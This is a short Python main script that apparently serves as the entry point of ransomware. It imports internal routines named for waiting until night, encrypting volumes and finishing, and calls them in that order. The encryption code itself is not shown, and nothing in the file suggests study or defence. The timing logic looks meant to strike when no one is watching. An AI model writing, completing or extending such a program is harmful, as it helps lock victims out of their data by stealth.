#!/bin/python3
# coding: utf-8

"""     libs        """
# Internal
from operation_systems.only_run_night import wait_for_run_time
from operation_systems.encrypt_files import encrypt_volumes
from operation_systems.done import done

"""     Main        """
wait_for_run_time()
encrypt_volumes()
done()
